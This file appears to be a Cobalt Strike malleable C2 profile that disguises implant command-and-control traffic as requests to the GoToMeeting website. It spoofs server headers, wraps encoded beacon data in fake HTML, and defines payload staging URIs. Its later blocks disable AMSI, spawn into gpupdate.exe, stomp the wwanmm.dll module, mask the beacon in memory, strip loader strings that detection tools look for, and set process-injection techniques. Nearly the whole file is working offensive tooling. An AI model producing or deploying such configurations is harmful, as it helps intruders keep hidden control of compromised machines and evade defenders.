#gotomeeting profile
#updated for 3.14
#this traffic mimics site traffic, NOT the actual ADP protocol used when the app loads and the meeting starts.
#xx0hcd

set sleeptime "37000";
set jitter    "25";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
set dns_idle "8.8.8.8";
set maxdns    "245";

set sample_name "gotomeeting.profile";

#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
    set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
        header "Content-Type" "text/html;charset=UTF-8";
	header "Connection" "close";
	header "Brightspot-Id" "00000459-72af-a783-feef2189";
	header "Cache-Control" "max-age=2";
	header "Server" "Apache-Coyote/1.1";
	header "X-Content-Type-Options" "nosniff";
	header "X-Powered-By" "Brightspot";
	header "Vary" "Accept-Encoding";
        set trust_x_forwarded_for "false";
    
}

http-get {

    set uri "/functionalStatus";
    
    client {

#set Host header to whatever
#       header "Host" "whatever.gotomeeting.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
	   
        metadata {
            base64url; 
	    parameter "_";

        }

    }

    server {
        
        output {

            netbios;	    
	   
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";
            print;
        }
    }
}

http-post {
    
    set uri "/rest/2/meetings";
    set verb "GET";

    client {

#set Host header to whatever
#        header "Host" "whatever.gotomeeting.com";
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";     
        
        output {
            base64url; 
	    parameter "includeMeetingsICoorganize";
        }


        id {
	    base64url;
	    parameter "includeCoorganizers";

        }
    }

    server {

        output {
            netbios;	    
	   
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";
            print;
        }
    }
}

http-stager {

    set uri_x86 "/Meeting/32251817/";
    set uri_x64 "/Meeting/32251816/";

    client {
#        header "Host" "whatever.gotomeeting.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
    }

    server {
    
    }


}

###Malleable PE Options###
#always test spawnto and module stomp before using. My examples tested on Windows 10 Pro.

post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}

#used peclone on wwanmm.dll. 
#don't use 'set image_size_xx' if using 'set module_xx'
stage {
	set checksum       "0";
	set compile_time   "25 Oct 2016 01:57:23";
	set entry_point    "170000";
#	set image_size_x86 "6586368";
#	set image_size_x64 "6586368";
#	set name	   "WWanMM.dll";
	set userwx 	   "false";
	set cleanup	   "true";
	set sleep_mask	   "true";
	set stomppe	   "true";
	set obfuscate	   "true";
	set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";


#module stomp

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
    }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
    }
}
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
